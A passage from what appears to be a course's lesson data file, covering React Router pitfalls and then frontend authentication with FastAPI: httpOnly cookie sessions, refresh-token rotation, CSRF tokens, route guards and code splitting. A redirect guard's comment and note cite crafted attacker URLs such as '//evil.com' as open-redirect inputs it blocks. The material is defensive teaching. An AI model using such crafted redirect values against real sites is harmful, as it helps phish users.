        `<b>Loader return values are re-read on every navigation that revalidates.</b> Don't put expensive work or side effects (analytics, toasts) in loaders, and don't mutate data in a loader; loaders should be safe to run any number of times. Mutations belong in actions.`,
        `<b>Creating the router inside a component</b> (or in a hook) recreates it on each render, resetting navigation state and refetching everything. Create it once at module level, or memoise it if it depends on something like a query client created once.`,
        `<b><code>NavLink</code> without <code>end</code></b> on a parent path (<code>/projects</code>) stays active for every descendant; that is usually what you want for section tabs but wrong for a "Projects overview" item next to "Projects / Archived". The root <code>/</code> is special-cased to match only itself.`,
        `<b>Hash routing (<code>createHashRouter</code>)</b> avoids server config because the server never sees the fragment, but it is a workaround: URLs are ugly, fragments can't be used for in-page anchors, and server logs can't see paths. Use it only when you genuinely cannot configure the server (e.g. some static file hosts).`
      ],
      best: [
        `Design URLs first, like an API: nouns, stable, readable (<code>/projects/42/settings</code>), with filters in search params. Changing a URL later means adding redirects for old bookmarks.`,
        `Keep every piece of state that defines "what screen is this" in the URL (path or search params); validate and default it when reading, omit defaults when writing.`,
        `Use <code>&lt;Link&gt;</code>/<code>&lt;NavLink&gt;</code> for navigation the user initiates, <code>navigate()</code> for navigation that follows an event, <code>redirect()</code> in loaders and actions, and <code>&lt;Navigate&gt;</code> only for render-time redirects such as guards.`,
        `Put an <code>errorElement</code> at the root and at every major section; throw typed 404/403 errors from loaders with <code>data(..., { status })</code>; show a <code>path: "*"</code> page inside the main layout.`,
        `Pass <code>request.signal</code> to every <code>fetch</code> in loaders so abandoned navigations cancel their requests.`,
        `Pair loaders with TanStack Query (<code>ensureQueryData</code>) for caching; keep loaders thin.`,
        `Configure the server fallback in the same commit that introduces client routing, exclude <code>/api</code>, and add a smoke test that refreshes a deep link on staging.`
      ],
      lab: [
        `In your Vite app run <code>npm install react-router</code>, create <code>src/routes/</code>, and replace <code>main.tsx</code> with the <code>createBrowserRouter</code> setup from example 1, with <code>RootLayout</code>, <code>Home</code>, <code>NotFound</code> and <code>RouteError</code>.`,
        `Add a <code>projects</code> section: a <code>ProjectsLayout</code> with a heading and an <code>&lt;Outlet /&gt;</code>, an index route listing projects (use a mock array or your FastAPI <code>/api/projects</code>), and <code>:projectId</code> with a loader that throws <code>data(..., { status: 404 })</code> for unknown ids. Give that route its own <code>errorElement</code>.`,
        `Add <code>q</code>, <code>status</code> and <code>page</code> search params to the list as in example 4, and make the loader use them. Check that Back steps through filter changes and that refresh preserves them.`,
        `Add a <code>projects/new</code> route with an action and <code>&lt;Form method="post"&gt;</code> that validates the name, shows returned errors, and redirects to the new project on success; show "Creating…" from <code>useNavigation</code>.`,
        `Run <code>npm run build</code>, serve <code>dist/</code> with a plain static server that has no fallback (e.g. <code>python -m http.server -d dist</code>), open <code>/projects/1</code> directly and observe the 404. Then serve it through nginx with <code>try_files</code> (or the FastAPI catch-all) and refresh again.`,
        `<b>Done when:</b> navigating between projects keeps the layout mounted (a counter in the layout keeps its value), an unknown project id shows your 404 message inside the layout, filters survive refresh, and refreshing <code>/projects/1</code> on the production-style server renders the page instead of a 404.`
      ],
      teach: `<p>"A single-page app loads one HTML file, then changes the URL itself with the History API. React Router maps the URL to a tree of route objects. In v7 data mode you create the router once with <code>createBrowserRouter</code> and render <code>RouterProvider</code>. Routes nest: <code>/projects/42</code> matches the root layout, the projects layout and the project page, and each parent renders its child in an <code>Outlet</code>, so layouts stay mounted while pages change. Links render real anchors but navigate without a reload; <code>useParams</code> reads path segments, <code>useSearchParams</code> keeps filters and pagination in the URL so refresh and sharing just work.</p>
<p>The data part: each route can have a loader that runs before it renders. The router runs all matched loaders in parallel, keeps the old page up meanwhile, aborts them if you navigate away, and sends failures to the nearest <code>errorElement</code>. Actions handle form posts and then re-run loaders so the screen is fresh. Combine loaders with TanStack Query for caching.</p>
<p>And the deployment trap: on refresh the server sees <code>/projects/42</code> and has no such file. nginx needs <code>try_files $uri $uri/ /index.html</code>, or FastAPI a catch-all after the API routes, but never for <code>/api</code>. Do that, and deep links and refreshes work."</p>`
    },
    /* ------------------------------------------------------------------ */
    {
      id: "d8-auth",
      title: "Authentication, protected routes and code splitting",
      lv: ["mid", "senior", "lead", "architect"],
      eli5: `<p>Think of a theme park. At the entrance you prove who you are (show your ticket: that's <b>logging in</b>), and they put a wristband on you. For the rest of the day, every ride checks the wristband, not your ticket. The wristband is your <b>session token</b>.</p>
<p>Where you keep the wristband matters. If it is tied on your wrist where nobody can untie it (an <b>httpOnly cookie</b>: the browser carries it, but the page's JavaScript can't touch it), a pickpocket can't take it. If you keep it in your pocket (<b>localStorage</b>), anyone who manages to sneak a hand into your pocket (a malicious script, <b>XSS</b>) can walk off with it and use it from anywhere.</p>
<p>The wristband expires quickly (an <b>access token</b>), so if it's ever misused it isn't for long. You also have a special voucher kept in a safe at the gate (a <b>refresh token</b>): when your wristband expires, the gate swaps the voucher for a new wristband and a new voucher, without making you queue for tickets again.</p>
<p>Some rides are for staff only. The park map can grey them out for visitors (<b>role-based UI</b>), but the real protection is the <b>guard at the ride</b> (the FastAPI backend) who checks the wristband every time. A visitor who ignores the grey map still can't get on. And the sign at a staff-only ride shouldn't flash "welcome!" for a second before the guard checks you: you wait at the gate (a <b>loading state</b>) until the check is done. Finally, the park doesn't build every ride before opening: rides nobody visits today are assembled only when someone walks up to them (<b>code splitting</b>).</p>`,
      what: `<p><b>Authentication</b> answers "who are you?" (login, sessions, tokens). <b>Authorisation</b> answers "what may you do?" (roles, permissions). In a React + FastAPI app the <b>backend</b> does both for real; the frontend's job is to hold the session correctly, show the right UI for the current user, redirect sensibly, and recover from expiry.</p>
<h5>Where to keep the session: cookies vs localStorage</h5>
<ul class="pts">
<li><b>JWT in <code>localStorage</code></b>, sent as <code>Authorization: Bearer …</code>: simple and immune to CSRF (the browser never attaches it automatically), but <b>any JavaScript on your origin can read it</b>. One XSS bug, or one compromised npm dependency or third-party script, and the attacker exfiltrates the token and replays it from their own machine until it expires.</li>
<li><b>httpOnly, Secure, SameSite cookie</b> set by FastAPI: JavaScript can't read it (<code>document.cookie</code> doesn't show it), the browser attaches it automatically to requests to your API. XSS can still <i>act</i> as the user while the page is open (it can call <code>fetch</code>), but it can't <b>steal</b> the credential for later use. The trade-off is <b>CSRF</b>: because the browser sends cookies automatically, you need CSRF protection.</li>
<li>A third option, an access token kept <b>only in memory</b> plus a refresh token in an httpOnly cookie, is common in SPAs talking to APIs on another domain; it limits theft to the short-lived access token but makes every page load start with a refresh call.</li>
</ul>
<p>For a React SPA served from the same site as its FastAPI API (e.g. nginx serving <code>/</code> and proxying <code>/api</code>), httpOnly cookies are the usual recommendation.</p>
<h5>Access and refresh tokens</h5>
<p>The <b>access token</b> is short-lived (minutes) and checked on every API call, often without a database hit (a signed JWT). The <b>refresh token</b> is long-lived (days), sent only to <code>/api/auth/refresh</code> (cookie <code>path</code>), and stored server-side (Redis or PostgreSQL) so it can be <b>revoked</b> (logout, password change, "log out all devices"). On every refresh the server <b>rotates</b> it: issues a new refresh token and invalidates the old one; if an old one is ever presented again, it was stolen, so the server revokes the whole token family.</p>
<h5>CSRF with cookies</h5>
<ul class="pts">
<li><b>CSRF</b>: a malicious site makes the user's browser send a request to your API (a hidden form post), and the browser attaches your cookies.</li>
<li><b><code>SameSite=Lax</code></b> stops cookies being sent on cross-site subrequests and cross-site POSTs, while still sending them on top-level GET navigations. <code>Strict</code> also blocks top-level navigations from other sites (users arriving from an email link look logged-out on that first request). <code>None</code> requires <code>Secure</code> and is needed only for genuinely cross-site setups.</li>
<li>"Site" is not "origin": <code>evil.example.com</code> and <code>app.example.com</code> are <b>same-site</b>, so SameSite does not protect you from a compromised or user-content subdomain. Add a CSRF token for state-changing requests (double-submit: a readable <code>csrf_token</code> cookie whose value the SPA copies into an <code>X-CSRF-Token</code> header; FastAPI compares them) and never change state on GET.</li>
</ul>
<h5>The frontend auth layer</h5>
<ul class="pts">
<li><b>Current user</b> comes from the server: <code>GET /api/me</code> returns the user (with roles) or 401. Model it as a TanStack Query (Day 7) exposed through an <code>AuthProvider</code> context (Day 6) with three explicit states: <code>loading</code>, <code>anonymous</code>, <code>authenticated</code>. Never guess the state from "is there something in localStorage".</li>
<li><b>Protected routes</b>: a layout route (<code>RequireAuth</code>) renders a spinner while loading, <code>&lt;Navigate to="/login" replace state={{ from: location }} /&gt;</code> when anonymous, and <code>&lt;Outlet /&gt;</code> when authenticated. In data mode you can also guard in a loader with <code>throw redirect("/login?redirectTo=…")</code>.</li>
<li><b>Role-based UI</b>: hide or disable what the user can't do, using roles/permissions from <code>/api/me</code>. This is UX only; the API must check every request.</li>
<li><b>Global 401 handling</b>: one fetch wrapper that, on 401, tries a refresh once (shared by all concurrent requests), retries, and if that fails marks the session anonymous; a <code>QueryCache</code>/<code>MutationCache</code> <code>onError</code> does the same for queries.</li>
<li><b>Logout</b>: tell the server (it revokes the refresh token and clears cookies), then remove all cached user data from TanStack Query and any stores.</li>
</ul>
<h5>Code splitting routes</h5>
<p>Without splitting, the login page ships the admin panel, the charts library and every page you have ever written. <code>React.lazy(() =&gt; import("./AdminPage"))</code> turns a module into a component that suspends until its chunk loads; wrap it in <code>&lt;Suspense fallback&gt;</code>. In data mode the route <code>lazy</code> property loads a route's component <i>and</i> its loader/action in parallel with navigation. Vite (Rollup) emits a separate chunk for every dynamic <code>import()</code>. Day 11 covers measuring bundles; here the focus is the routing and loading-state side.</p>`,
      why: `<p>Almost every real app has users, and auth is where frontend mistakes become security incidents. The classic tutorial pattern (POST credentials, put the JWT in <code>localStorage</code>, read it in a <code>useEffect</code>, check <code>if (token)</code> in components) produces a familiar list of bugs: tokens stolen by XSS or a compromised dependency; protected pages flashing for a moment before redirecting (or the login page flashing for logged-in users) because the check is asynchronous; users bounced to the home page instead of where they were going; dozens of requests each failing with 401 and each triggering its own refresh; the previous user's data visible after logout on a shared computer; and "admin-only" buttons hidden in React but the API happily accepting the request from <code>curl</code>.</p>
<p>A deliberate design avoids these: the server owns the credential (httpOnly cookies, rotation, revocation in Redis), the client owns a well-defined <i>auth state machine</i> (loading/anonymous/authenticated) derived from <code>/api/me</code>, routes are guarded in one place, 401s are handled in one place, and logout resets one cache.</p>
<p>Code splitting belongs here because protected areas are the natural split points: anonymous users should download only the login page and public shell, and most users never open the admin section. Splitting by route is the cheapest, highest-impact performance win in a typical SPA, and it interacts with the same Suspense and loading-state concerns as auth.</p>`,
      diagram: {
        html: flow([
          ["App boot", "GET /api/me (cookie sent)", "w"],
          ["AuthProvider", "status: loading → spinner"],
          ["200 → authenticated", "RequireAuth renders &lt;Outlet&gt;", "g"],
          ["401 → anonymous", "&lt;Navigate to=/login state={from}&gt;", "r"],
          ["Login POST", "FastAPI sets httpOnly cookies"],
          ["navigate(from)", "back to where they were", "g"]
        ]) + lanes([
          ["Browser", ["access_token: httpOnly, Path=/api, 15 min", "refresh_token: httpOnly, Path=/api/auth, 14 days", "csrf_token: readable, copied to X-CSRF-Token", "JS sees only the CSRF cookie"]],
          ["React", ["apiFetch: 401 → one shared refresh → retry", "QueryCache onError: 401 → end session", "RequireAuth / RequireRole guards", "logout → remove cached queries"]],
          ["FastAPI + Redis", ["get_current_user reads cookie, 401 if invalid", "require_role(\"admin\") → 403", "refresh rotates token; jti stored in Redis", "logout deletes jti, clears cookies"]]
        ]),
        steps: [
          `On boot, <code>AuthProvider</code> runs a query for <code>/api/me</code>. The browser attaches the httpOnly cookie automatically; React never sees the token. Until the response arrives the status is <code>loading</code> and guards render a spinner, not the page and not a redirect.`,
          `If <code>/api/me</code> returns the user, the status becomes <code>authenticated</code> and <code>RequireAuth</code> renders its <code>&lt;Outlet /&gt;</code>. If it returns 401 (after one refresh attempt), the status is <code>anonymous</code> and the guard redirects to <code>/login</code> with the current location in <code>state.from</code>.`,
          `The login form POSTs credentials; FastAPI verifies them against PostgreSQL, stores the refresh token id in Redis, and sets the cookies. The client writes the returned user into the <code>["me"]</code> query and navigates to <code>from</code> with <code>replace</code>.`,
          `Later an API call returns 401 because the access token expired. The fetch wrapper starts <b>one</b> refresh request (concurrent 401s wait on the same promise), FastAPI rotates the tokens, and the original requests are retried transparently.`,
          `If the refresh fails (revoked, expired, reused), the global handler removes cached queries and sets the user to <code>null</code>; any protected route re-renders and redirects to login.`,
          `On logout the client POSTs <code>/api/auth/logout</code> (server deletes the Redis entry and clears cookies), then clears the cache so no previous-user data survives.`
        ]
      },
      ex: [
        {
          t: "FastAPI: login, refresh, logout and /api/me with httpOnly cookies (Python)",
          lang: "py",
          code: `# app/auth.py  (sketch: create_access_token, create_refresh_token, decode_token,
#               authenticate, get_db, get_redis, LoginIn, UserOut are your own helpers)
import secrets
from datetime import timedelta
from fastapi import APIRouter, Depends, HTTPException, Request, Response
from fastapi.responses import JSONResponse

router = APIRouter()
ACCESS_TTL = timedelta(minutes=15)
REFRESH_TTL = timedelta(days=14)

def set_session_cookies(response: Response, access: str, refresh: str) -> None:
    response.set_cookie("access_token", access, max_age=int(ACCESS_TTL.total_seconds()),
                        httponly=True, secure=True, samesite="lax", path="/api")
    response.set_cookie("refresh_token", refresh, max_age=int(REFRESH_TTL.total_seconds()),
                        httponly=True, secure=True, samesite="strict", path="/api/auth")
    # readable by JS on purpose: the SPA copies it into the X-CSRF-Token header
    response.set_cookie("csrf_token", secrets.token_urlsafe(32), max_age=int(REFRESH_TTL.total_seconds()),
                        httponly=False, secure=True, samesite="lax", path="/")

def clear_session_cookies(response: Response) -> None:
    response.delete_cookie("access_token", path="/api")
    response.delete_cookie("refresh_token", path="/api/auth")
    response.delete_cookie("csrf_token", path="/")

async def get_current_user(request: Request, db=Depends(get_db)):
    token = request.cookies.get("access_token")
    claims = decode_token(token) if token else None      # None if missing, expired or forged
    if claims is None:
        raise HTTPException(status_code=401, detail="Not authenticated")
    user = await db.get_user(int(claims["sub"]))
    if user is None or not user.is_active:
        raise HTTPException(status_code=401, detail="Not authenticated")
    return user

@router.post("/auth/login", response_model=UserOut)
async def login(body: LoginIn, response: Response, db=Depends(get_db), redis=Depends(get_redis)):
    user = await authenticate(db, body.email, body.password)
    if user is None:
        raise HTTPException(status_code=401, detail="Invalid email or password")
    refresh, jti = create_refresh_token(user.id)
    await redis.set(f"refresh:{jti}", user.id, ex=int(REFRESH_TTL.total_seconds()))
    set_session_cookies(response, create_access_token(user.id), refresh)
    return user

@router.post("/auth/refresh", status_code=204)
async def refresh(request: Request, response: Response, redis=Depends(get_redis)):
    claims = decode_token(request.cookies.get("refresh_token") or "")
    # GETDEL makes each refresh token single-use (rotation); a missing key means reuse or revocation
    if claims is None or await redis.getdel(f"refresh:{claims['jti']}") is None:
        expired = JSONResponse({"detail": "Session expired"}, status_code=401)
        clear_session_cookies(expired)   # cookies must go on the response we actually return
        return expired
    new_refresh, new_jti = create_refresh_token(int(claims["sub"]))
    await redis.set(f"refresh:{new_jti}", claims["sub"], ex=int(REFRESH_TTL.total_seconds()))
    set_session_cookies(response, create_access_token(int(claims["sub"])), new_refresh)

@router.post("/auth/logout", status_code=204)
async def logout(request: Request, response: Response, redis=Depends(get_redis)):
    claims = decode_token(request.cookies.get("refresh_token") or "")
    if claims is not None:
        await redis.delete(f"refresh:{claims['jti']}")
    clear_session_cookies(response)

@router.get("/me", response_model=UserOut)
async def me(user=Depends(get_current_user)):
    return user                      # { id, email, name, roles }`,
          note: `<p>The cookie <code>path</code> values do real work: the access token is only sent to <code>/api</code>, and the refresh token only to <code>/api/auth/*</code>, so it isn't attached to every request. Note one FastAPI subtlety: when you <i>raise</i> an <code>HTTPException</code>, cookies set on the injected <code>response</code> parameter are not sent, which is why the failing refresh path builds and <i>returns</i> a <code>JSONResponse</code> and deletes the cookies on that object. <code>GETDEL</code> needs Redis 6.2 or newer; on older servers use a pipeline or Lua script. Browsers generally accept <code>Secure</code> cookies on <code>http://localhost</code>; if yours doesn't, make <code>secure</code> configurable for development. In development, use Vite's <code>server.proxy</code> for <code>/api</code> so the SPA and API are same-origin and cookies just work.</p>`
        },
        {
          t: "One fetch wrapper: CSRF header, 401 → single shared refresh → retry (src/auth/api.ts)",
          lang: "ts",
          code: `export class ApiError extends Error {
  readonly status: number;
  readonly body: unknown;
  constructor(status: number, body: unknown) {
    super(\`API error \${status}\`);
    this.name = "ApiError";
    this.status = status;
    this.body = body;
  }
}

// Single-flight: if ten requests get 401 at once, they all await the SAME refresh.
let refreshPromise: Promise<boolean> | null = null;

function refreshSession(): Promise<boolean> {
  refreshPromise ??= fetch("/api/auth/refresh", { method: "POST", credentials: "include" })
    .then((res) => res.ok)
    .catch(() => false)
    .finally(() => {
      refreshPromise = null;
    });
  return refreshPromise;
}

function readCookie(name: string): string | undefined {
  const entry = document.cookie.split("; ").find((c) => c.startsWith(name + "="));
  return entry ? decodeURIComponent(entry.slice(name.length + 1)) : undefined;
}

async function request(path: string, init: RequestInit, retried: boolean): Promise<Response> {
  const method = (init.method ?? "GET").toUpperCase();
  const headers = new Headers(init.headers);
  if (typeof init.body === "string" && !headers.has("Content-Type")) {
    headers.set("Content-Type", "application/json");
  }
  if (method !== "GET" && method !== "HEAD") {
    const csrf = readCookie("csrf_token");
    if (csrf) headers.set("X-CSRF-Token", csrf);
  }

  const res = await fetch(path, { ...init, headers, credentials: "include" });

  // Don't try to refresh for the auth endpoints themselves (wrong password is a real 401).
  if (res.status === 401 && !retried && !path.startsWith("/api/auth/")) {
    if (await refreshSession()) return request(path, init, true);
  }
  return res;
}

export async function apiFetch<T>(path: string, init: RequestInit = {}): Promise<T> {
  const res = await request(path, init, false);
  if (!res.ok) {
    const body: unknown = await res.json().catch(() => null);
    throw new ApiError(res.status, body);
  }
  if (res.status === 204) return undefined as T;
  return (await res.json()) as T;
}`,
          note: `<p>Everything that talks to FastAPI goes through <code>apiFetch</code>, so there is exactly one place that knows about cookies, CSRF and refresh. <code>credentials: "include"</code> is needed only if the API is on another origin (then FastAPI's <code>CORSMiddleware</code> must use <code>allow_credentials=True</code> with explicit <code>allow_origins</code>, never <code>"*"</code>); for same-origin requests the default already sends cookies, and being explicit is harmless. The single-flight promise matters doubly with <b>rotation</b>: two parallel refresh calls would present the same refresh token twice, and the second would look like token theft and log the user out.</p>`
        },
        {
          t: "Session state: the ['me'] query, endSession, and a QueryClient that handles 401 globally (src/auth/session.ts)",
          lang: "ts",
          code: `import { MutationCache, QueryCache, QueryClient } from "@tanstack/react-query";
import { ApiError, apiFetch } from "./api";

export type Role = "viewer" | "editor" | "admin";
export type User = { id: number; email: string; name: string; roles: Role[] };

export const meQueryKey = ["me"] as const;

// Anonymous is a normal state, not an error: 401 → null.
export async function fetchMe(): Promise<User | null> {
  try {
    return await apiFetch<User>("/api/me");
  } catch (err) {
    if (err instanceof ApiError && err.status === 401) return null;
    throw err;
  }
}

const isUnauthorized = (error: unknown) => error instanceof ApiError && error.status === 401;

export const queryClient = new QueryClient({
  queryCache: new QueryCache({
    onError: (error) => {
      if (isUnauthorized(error)) endSession(null);
    },
  }),
  mutationCache: new MutationCache({
    onError: (error) => {
      if (isUnauthorized(error)) endSession(null);
    },
  }),
  defaultOptions: {
    queries: {
      // don't retry 4xx (401/403/404 won't fix themselves); retry 5xx and network errors twice
      retry: (failureCount, error) =>
        !(error instanceof ApiError && error.status < 500) && failureCount < 2,
    },
  },
});

// Called on login (with the new user), logout and expired sessions (with null).
// Removes every cached query except "me", then sets "me", so the next user never sees
// the previous user's data and observers of "me" (the guards) re-render.
export function endSession(user: User | null) {
  void queryClient.cancelQueries();
  queryClient.removeQueries({ predicate: (query) => query.queryKey[0] !== meQueryKey[0] });
  queryClient.setQueryData<User | null>(meQueryKey, user);
}`,
          note: `<p>Because <code>apiFetch</code> already tried a refresh, a 401 that reaches TanStack Query means the session is really over. <code>QueryCache</code>/<code>MutationCache</code> <code>onError</code> run once per failed query or mutation, at the cache level, so you don't repeat this logic in every <code>useQuery</code>. Setting <code>["me"]</code> to <code>null</code> flips the auth state to anonymous, and whichever protected route is on screen redirects to login by itself; public pages stay put. (The <code>me</code> query keeps its observers; we remove everything else.)</p>`
        },
        {
          t: "AuthProvider and useAuth (src/auth/AuthProvider.tsx)",
          lang: "tsx",
          code: `import { createContext, useContext, type ReactNode } from "react";
import { useQuery } from "@tanstack/react-query";
import { apiFetch } from "./api";
import { endSession, fetchMe, meQueryKey, type Role, type User } from "./session";

type AuthState =
  | { status: "loading"; user: null }
  | { status: "anonymous"; user: null }
  | { status: "authenticated"; user: User };

type AuthContextValue = AuthState & {
  login: (email: string, password: string) => Promise<User>;
  logout: () => Promise<void>;
  hasRole: (role: Role) => boolean;
};

const AuthContext = createContext<AuthContextValue | null>(null);

export function AuthProvider({ children }: { children: ReactNode }) {
  const me = useQuery({
    queryKey: meQueryKey,
    queryFn: fetchMe,
    staleTime: 5 * 60_000, // re-check the session at most every 5 minutes (and on window focus)
    retry: false,
  });

  let state: AuthState;
  if (me.isPending) state = { status: "loading", user: null };
  else if (me.data) state = { status: "authenticated", user: me.data };
  else state = { status: "anonymous", user: null }; // 401, or /api/me failed: treat as logged out

  async function login(email: string, password: string) {
    const user = await apiFetch<User>("/api/auth/login", {
      method: "POST",
      body: JSON.stringify({ email, password }),
    });
    endSession(user); // drop anything cached for a previous user, then set the new one
    return user;
  }

  async function logout() {
    try {
      await apiFetch<void>("/api/auth/logout", { method: "POST" });
    } finally {
      endSession(null); // even if the network call failed, forget everything locally
    }
  }

  const hasRole = (role: Role) => state.user?.roles.includes(role) ?? false;

  // React 19: <AuthContext value={...}> works as a provider; <AuthContext.Provider> also still works.
  return <AuthContext value={{ ...state, login, logout, hasRole }}>{children}</AuthContext>;
}

export function useAuth(): AuthContextValue {
  const ctx = useContext(AuthContext);
  if (!ctx) throw new Error("useAuth must be used inside <AuthProvider>");
  return ctx;
}`,
          note: `<p>The provider holds no token and no copy of the user in <code>useState</code>: the TanStack Query cache is the single source of truth, so login, logout, the global 401 handler and a background re-check all update the same place. The discriminated union means <code>if (auth.status === "authenticated") auth.user.name</code> type-checks without <code>!</code>. Mount it outside the router: <code>&lt;QueryClientProvider client={queryClient}&gt;&lt;AuthProvider&gt;&lt;RouterProvider router={router} /&gt;&lt;/AuthProvider&gt;&lt;/QueryClientProvider&gt;</code>. Because it sits outside <code>RouterProvider</code>, it can't call <code>useNavigate</code>; redirects are done by the guards. The context value is a new object each render; Day 6 shows how to split or memoise it if consumers re-render too often.</p>`
        },
        {
          t: "Protected routes without the flash, and redirect back after login",
          lang: "tsx",
          code: `// src/auth/RequireAuth.tsx
import { Navigate, Outlet, useLocation } from "react-router";
import { useAuth } from "./AuthProvider";
import type { Role } from "./session";

export function FullPageSpinner() {
  return <div className="spinner" role="status" aria-label="Loading" />;
}

export function RequireAuth() {
  const auth = useAuth();
  const location = useLocation();

  if (auth.status === "loading") return <FullPageSpinner />; // not the page, not a redirect
  if (auth.status === "anonymous") {
    return <Navigate to="/login" replace state={{ from: location }} />;
  }
  return <Outlet />;
}

export function RequireRole({ role }: { role: Role }) {
  const { hasRole } = useAuth();
  return hasRole(role) ? <Outlet /> : <p role="alert">You don't have access to this page.</p>;
}

// src/routes/LoginPage.tsx
import { useState } from "react";
import { Navigate, useLocation, useNavigate, type Location } from "react-router";
import { ApiError } from "../auth/api";
import { useAuth } from "../auth/AuthProvider";

export function LoginPage() {
  const auth = useAuth();
  const navigate = useNavigate();
  const location = useLocation();
  const from = (location.state as { from?: Location } | null)?.from;
  const target = from ? from.pathname + from.search + from.hash : "/";
  const [error, setError] = useState<string | null>(null);
  const [pending, setPending] = useState(false);

  if (auth.status === "authenticated") return <Navigate to={target} replace />;

  async function submit(form: FormData) {
    setPending(true);
    setError(null);
    try {
      await auth.login(String(form.get("email") ?? ""), String(form.get("password") ?? ""));
      navigate(target, { replace: true }); // replace: Back must not return to /login
    } catch (err) {
      setError(err instanceof ApiError && err.status === 401 ? "Wrong email or password." : "Login failed. Try again.");
    } finally {
      setPending(false);
    }
  }

  return (
    <form
      onSubmit={(e) => {
        e.preventDefault();
        void submit(new FormData(e.currentTarget));
      }}
    >
      <label>Email <input name="email" type="email" autoComplete="username" required /></label>
      <label>Password <input name="password" type="password" autoComplete="current-password" required /></label>
      {error && <p role="alert">{error}</p>}
      <button type="submit" disabled={pending}>{pending ? "Signing in…" : "Sign in"}</button>
    </form>
  );
}

// route config (excerpt)
// {
//   path: "/", element: <RootLayout />, errorElement: <RouteError />, children: [
//     { index: true, element: <Home /> },
//     { path: "login", element: <LoginPage /> },
//     { element: <RequireAuth />, children: [                 // pathless guard layout
//         { path: "projects", element: <ProjectList /> },
//         { element: <RequireRole role="admin" />, children: [
//             { path: "admin", element: <AdminPage /> } ] } ] },
//     { path: "*", element: <NotFound /> } ] }`,
          out: `Logged-out user opens /projects?status=active
→ spinner for ~100 ms (/api/me in flight) → redirected to /login (history entry replaced)
→ signs in → lands on /projects?status=active; Back goes to the page before /projects, not to /login.`,
          note: `<p>The <b>flash</b> bug comes from treating "not known yet" as "logged out" (redirecting to login, then bouncing back) or as "logged in" (rendering the page, then redirecting). Three states fix it. <code>replace</code> on both redirects keeps <code>/login</code> out of the history stack. Passing the whole <code>location</code> in <code>state</code> preserves the search string and hash, not just the path. Location state is per history entry and not part of the URL, so it can't be forged into a link (unlike a <code>?redirectTo=</code> parameter, next example).</p>`
        },
        {
          t: "Guarding in a loader (data mode) with a safe redirectTo",
          lang: "ts",
          code: `// src/auth/guards.ts
import { redirect, type LoaderFunctionArgs } from "react-router";
import { fetchMe, meQueryKey, queryClient, type Role } from "./session";

// Only allow same-origin paths: blocks "https://evil.com" and "//evil.com" (open redirect).
export function safeRedirect(to: string | null, fallback = "/"): string {
  if (!to) return fallback;
  const url = new URL(to, window.location.origin);
  return url.origin === window.location.origin ? url.pathname + url.search + url.hash : fallback;
}

export async function requireUser({ request }: LoaderFunctionArgs) {
  // cached for staleTime; otherwise calls /api/me once
  const user = await queryClient.ensureQueryData({ queryKey: meQueryKey, queryFn: fetchMe });
  if (!user) {
    const url = new URL(request.url);
    throw redirect(\`/login?redirectTo=\${encodeURIComponent(url.pathname + url.search)}\`);
  }
  return user;
}

export function requireRole(role: Role) {
  return async (args: LoaderFunctionArgs) => {
    const user = await requireUser(args);
    if (!user.roles.includes(role)) {
      throw new Response("Forbidden", { status: 403 }); // handled by the nearest errorElement
    }
    return user;
  };
}

// Usage in the route config:
//   { path: "admin", loader: requireRole("admin"), element: <AdminPage /> }
// In LoginPage after success:
//   const [params] = useSearchParams();
//   navigate(safeRedirect(params.get("redirectTo")), { replace: true });`,
          note: `<p>Loader guards run <i>before</i> rendering, so there is nothing to flash, and the redirect target survives a page refresh because it is in the URL. The price: the URL can be crafted by an attacker (<code>/login?redirectTo=https://evil.example</code>), so always pass it through <code>safeRedirect</code>. Remember loaders on a route chain run <b>in parallel</b>: a guard in a parent loader does not stop child loaders from starting their fetches. Either guard every data route's loader, or rely on the API returning 401/403 (which it must anyway). Newer 7.x releases add route <b>middleware</b> designed for exactly this kind of cross-cutting check; whether it's available and stable depends on your version, so check the docs before relying on it.</p>`
        },
        {
          t: "Role-based UI in React, enforced in FastAPI",
          lang: "tsx",
          code: `// src/auth/Can.tsx: hide UI the current user can't use (UX only, not security)
import type { ReactNode } from "react";
import { useAuth } from "./AuthProvider";
import type { Role } from "./session";

export function Can({ role, children, fallback = null }: { role: Role; children: ReactNode; fallback?: ReactNode }) {
  const { hasRole } = useAuth();
  return hasRole(role) ? children : fallback;
}

// in a page:
// <Can role="admin" fallback={<span title="Admins only">Delete (disabled)</span>}>
//   <button onClick={() => deleteProject.mutate(project.id)}>Delete</button>
// </Can>

/* ---------- FastAPI: the real check (Python) ----------
def require_role(role: str):
    async def checker(user=Depends(get_current_user)):
        if role not in user.roles:
            raise HTTPException(status_code=403, detail="Forbidden")
        return user
    return checker

@router.delete("/projects/{project_id}", status_code=204,
               dependencies=[Depends(require_role("admin")), Depends(verify_csrf)])
async def delete_project(project_id: int, db=Depends(get_db)):
    await db.delete_project(project_id)

async def verify_csrf(request: Request):
    if request.method in ("GET", "HEAD", "OPTIONS"):
        return
    cookie = request.cookies.get("csrf_token")
    header = request.headers.get("x-csrf-token")
    if not cookie or not header or not secrets.compare_digest(cookie, header):
        raise HTTPException(status_code=403, detail="CSRF check failed")
*/`,
          note: `<p>Everything in the browser is under the user's control: they can edit React state in DevTools, change the <code>roles</code> array in the <code>/api/me</code> response with a proxy, or call your API with <code>curl</code>. Hiding the Delete button prevents confusion; the <code>require_role</code> dependency prevents the deletion. For finer control, have <code>/api/me</code> return <b>permissions</b> (<code>"project:delete"</code>) computed by the backend instead of raw roles, so the frontend doesn't duplicate the role → permission mapping. Row-level rules ("only the owner can edit") must also live in the API query.</p>`
        },
        {
          t: "Code splitting: React.lazy + Suspense, and route lazy (src/router.tsx)",
          lang: "tsx",
          code: `import { lazy, Suspense } from "react";
import { createBrowserRouter } from "react-router";
import RootLayout from "./routes/RootLayout";
import RouteError from "./routes/RouteError";
import Home from "./routes/Home";
import { LoginPage } from "./routes/LoginPage";
import { FullPageSpinner, RequireAuth, RequireRole } from "./auth/RequireAuth";

// 1) React.lazy: the module must have a DEFAULT export that is a component
const SettingsPage = lazy(() => import("./routes/SettingsPage"));

export const router = createBrowserRouter([
  {
    path: "/",
    element: <RootLayout />,
    errorElement: <RouteError />,
    children: [
      { index: true, element: <Home /> },
      { path: "login", element: <LoginPage /> },
      {
        element: <RequireAuth />,
        children: [
          {
            path: "settings",
            element: (
              <Suspense fallback={<FullPageSpinner />}>
                <SettingsPage />
              </Suspense>
            ),
          },
          {
            // 2) route lazy: code AND loader load on navigation, in parallel with other loaders
            path: "projects",
            lazy: async () => {
              const mod = await import("./routes/projects");
              return { Component: mod.ProjectList, loader: mod.projectsLoader };
            },
          },
          {
